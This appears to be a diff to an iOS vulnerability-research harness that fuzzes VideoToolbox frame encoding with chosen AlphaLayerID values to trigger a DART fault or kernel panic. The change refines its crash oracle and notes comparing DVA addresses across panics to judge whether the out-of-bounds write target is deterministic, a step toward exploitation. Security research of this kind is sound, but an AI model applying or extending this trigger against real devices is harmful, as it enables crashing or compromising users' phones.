@@ -1963,6 +1963,7 @@ static void runEscalation(void) {
 static int g_narrowIndex = 0;
 static int g_narrowValues[] = {255, 63, 200, 128, 100, 64, 32, 62};
 static int g_narrowCount = 8;
+static volatile BOOL g_narrowGotOutput = NO;
 
 static void narrowOracleCallback(
     void *ctx, void *sourceFrameRefCon, OSStatus status,
@@ -1972,7 +1973,8 @@ static void narrowOracleCallback(
         return;
     }
     if (sampleBuffer) {
-        PASS(@"[Narrow] Encode callback received — NO PANIC from this value");
+        g_narrowGotOutput = YES;
+        PASS(@"[Narrow] Encode callback received — frame delivered");
         bitstreamOracle(sampleBuffer, g_oracleContext ?: @"narrow");
     }
 }
@@ -2042,6 +2044,7 @@ static void runNarrowPanic(void) {
         return;
     }
 
+    g_narrowGotOutput = NO;
     INFO(@"*** ENCODING SINGLE FRAME — if phone reboots, AlphaLayerID=%d is the trigger ***", val);
 
     status = VTCompressionSessionEncodeFrame(session, pb,
@@ -2051,11 +2054,19 @@ static void runNarrowPanic(void) {
     VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
     INFO(@"CompleteFrames done");
 
-    [NSThread sleepForTimeInterval:2.0];
-    PASS(@"=== AlphaLayerID=%d: SURVIVED (no DART fault after 2s) ===", val);
+    [NSThread sleepForTimeInterval:3.0];
+
+    if (g_narrowGotOutput) {
+        PASS(@"=== AlphaLayerID=%d: SURVIVED — frame delivered, no DART fault after 3s ===", val);
+    } else {
+        FAIL(@"=== AlphaLayerID=%d: NO OUTPUT — encode silently failed (no callback) ===", val);
+        INFO(@"Session may have failed without panic — not a clean survival.");
+    }
 
     int next_val = g_narrowValues[g_narrowIndex % g_narrowCount];
     INFO(@"Next press will test AlphaLayerID=%d", next_val);
+    INFO(@"If phone crashed, save the .ips panic log — compare DVA addresses");
+    INFO(@"across crashes to check if write target is deterministic.");
 
     CVPixelBufferRelease(pb);
     VTCompressionSessionInvalidate(session);
